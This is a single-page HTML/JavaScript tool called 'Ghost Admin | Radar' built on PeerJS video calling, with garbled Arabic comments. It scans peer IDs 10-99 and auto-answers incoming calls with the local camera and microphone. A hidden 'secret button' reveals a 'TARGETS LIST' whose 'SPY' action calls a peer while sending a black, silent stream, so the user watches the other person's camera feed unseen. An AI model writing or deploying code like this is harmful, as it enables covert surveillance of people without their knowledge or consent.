<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghost Admin | Radar</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', monospace; }
        body { background: #000; color: #0f0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        #loginScreen { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .card { border: 1px solid #0f0; padding: 20px; width: 90%; max-width: 400px; box-shadow: 0 0 15px #0f0; background: #050505; }
        .my-id { font-size: 3rem; font-weight: bold; margin: 20px 0; color: white; text-shadow: 0 0 10px #0f0; }
        input { width: 100%; padding: 15px; margin-bottom: 10px; background: #111; border: 1px solid #0f0; color: white; text-align: center; font-size: 1.2rem; }
        button { width: 100%; padding: 15px; background: #003300; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; font-size: 1rem; margin-top: 5px; }
        button:hover { background: #0f0; color: black; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ù†Ø¸Ø§Ù… */
        #mainInterface { display: none; height: 100%; flex-direction: column; }
        .video-area { flex: 1; position: relative; display: flex; border-bottom: 2px solid #0f0; }
        .vid { flex: 1; border-right: 1px solid #0f0; position: relative; background: #111; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .label { position: absolute; bottom: 5px; left: 5px; background: black; padding: 2px 5px; font-size: 0.8rem; }

        /* === Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³Ø±ÙŠØ© (Ù…Ø®ÙÙŠØ© ÙÙŠ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©) === */
        .admin-panel { 
            height: 30%; background: #050505; padding: 10px; overflow-y: auto; 
            border-top: 2px solid #0f0; display: none; /* Ù…Ø®ÙÙŠØ© */
        }
        .user-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px dashed #333; align-items: center; }
        .btn-spy { background: #300; color: red; border-color: red; padding: 5px 10px; font-size: 0.8rem; width: auto; }

        /* === Ø§Ù„Ø²Ø± Ø§Ù„Ø³Ø±ÙŠ === */
        #secretBtn {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 30px;
            height: 30px;
            background: rgba(255, 0, 0, 0.3); /* Ø£Ø­Ù…Ø± Ø´ÙØ§Ù Ù„ØªØ¹Ø±Ù Ù…ÙƒØ§Ù†Ù‡ */
            z-index: 9999;
            cursor: pointer;
        }
        #secretBtn:hover { background: red; } /* Ø¹Ù†Ø¯ ÙˆØ¶Ø¹ Ø§Ù„Ù…Ø§ÙˆØ³ ÙŠØµØ¨Ø­ Ø£Ø­Ù…Ø± */

    </style>
</head>
<body>

    <!-- 1. Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div id="loginScreen">
        <div class="card">
            <h1>ğŸ“¡ SYSTEM LOGIN</h1>
            <p style="color:#777">YOUR ID:</p>
            <div class="my-id" id="myIdDisplay">--</div>
            
            <input type="number" id="targetId" placeholder="Target ID">
            <button onclick="connectManual()">Connect</button>
            <button onclick="autoScan()" style="background:#004444; color:#0ff; border-color:#0ff;">ğŸ” Auto Scan (10-99)</button>
        </div>
    </div>

    <!-- 2. Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© -->
    <div id="mainInterface">
        <div class="video-area">
            <div class="vid">
                <video id="localVideo" autoplay muted></video>
                <div class="label">ADMIN (ME)</div>
            </div>
            <div class="vid">
                <video id="remoteVideo" autoplay></video>
                <div class="label">TARGET</div>
            </div>
        </div>

        <!-- Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³Ø±ÙŠØ© -->
        <div class="admin-panel" id="adminPanel">
            <h3 style="border-bottom:1px solid #0f0; margin-bottom:10px;">ğŸ“‹ TARGETS LIST</h3>
            <div id="usersList">No targets yet...</div>
        </div>
    </div>

    <!-- Ø§Ù„Ø²Ø± Ø§Ù„Ø³Ø±ÙŠ -->
    <div id="secretBtn" onclick="toggleAdminPanel()"></div>

    <script>
        const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
        document.getElementById('myIdDisplay').innerText = myId;

        let peer = new Peer(myId);
        let conn = null;
        let call = null;
        let localStream = null;
        let detectedHistory = JSON.parse(localStorage.getItem('targets') || "[]");

        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
            localStream = stream;
            document.getElementById('localVideo').srcObject = stream;
        });

        peer.on('open', id => console.log('My ID:', id));
        peer.on('connection', c => { conn = c; saveUser(conn.peer); setupConnection(); });
        peer.on('call', incomingCall => {
            incomingCall.answer(localStream);
            call = incomingCall;
            call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
            saveUser(incomingCall.peer);
            enterSystem();
        });

        // --- ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø²Ø± Ø§Ù„Ø³Ø±ÙŠ ---
        function toggleAdminPanel() {
            let panel = document.getElementById('adminPanel');
            if(panel.style.display === 'none' || panel.style.display === '') {
                panel.style.display = 'block'; // Ø¥Ø¸Ù‡Ø§Ø±
            } else {
                panel.style.display = 'none'; // Ø¥Ø®ÙØ§Ø¡
            }
        }

        function connectManual() {
            let id = document.getElementById('targetId').value;
            if(!id) return alert("Enter ID");
            initiateCall(id);
        }

        window.scanIndex = 10;
        window.isScanning = false;
        function autoScan() {
            window.isScanning = true;
            document.querySelector('button[onclick="autoScan()"]').innerText = "SCANNING...";
            scanNext();
        }

        function scanNext() {
            if(!window.isScanning) return;
            if(window.scanIndex > 99) window.scanIndex = 10;
            let target = window.scanIndex.toString();
            if(target === myId) { window.scanIndex++; return scanNext(); }
            
            let testConn = peer.connect(target);
            let found = false;
            testConn.on('open', () => {
                found = true; window.isScanning = false;
                saveUser(target); initiateCall(target);
            });
            setTimeout(() => { if(!found) { testConn.close(); window.scanIndex++; scanNext(); } }, 200);
        }

        function initiateCall(id) {
            conn = peer.connect(id);
            conn.on('open', () => {
                setupConnection();
                call = peer.call(id, localStream);
                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                enterSystem();
            });
        }

        function setupConnection() { conn.on('close', () => alert("Disconnected")); }

        function enterSystem() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('mainInterface').style.display = 'flex';
            renderUsers();
        }

        function saveUser(id) {
            if(!detectedHistory.includes(id)) {
                detectedHistory.push(id);
                localStorage.setItem('targets', JSON.stringify(detectedHistory));
                renderUsers();
            }
        }

        function renderUsers() {
            let container = document.getElementById('usersList');
            if(detectedHistory.length === 0) return;
            container.innerHTML = '';
            detectedHistory.forEach(id => {
                let row = `
                    <div class="user-row">
                        <span style="font-weight:bold; font-size:1.2rem;">TARGET #${id}</span>
                        <button class="btn-spy" onclick="spyAction('${id}')">ğŸ‘ï¸ SPY</button>
                    </div>`;
                container.innerHTML += row;
            });
        }

        function spyAction(id) {
            let canvas = document.createElement('canvas');
            canvas.width = 100; canvas.height = 100;
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = "black"; ctx.fillRect(0,0,100,100);
            let blackStream = canvas.captureStream(25);
            let audioCtx = new AudioContext();
            let dest = audioCtx.createMediaStreamDestination();
            blackStream.addTrack(dest.stream.getAudioTracks()[0]);

            call = peer.call(id, blackStream);
            call.on('stream', rs => {
                document.getElementById('remoteVideo').srcObject = rs;
                document.getElementById('localVideo').srcObject = blackStream;
                enterSystem();
            });
        }
        renderUsers();
    </script>
</body>
</html>
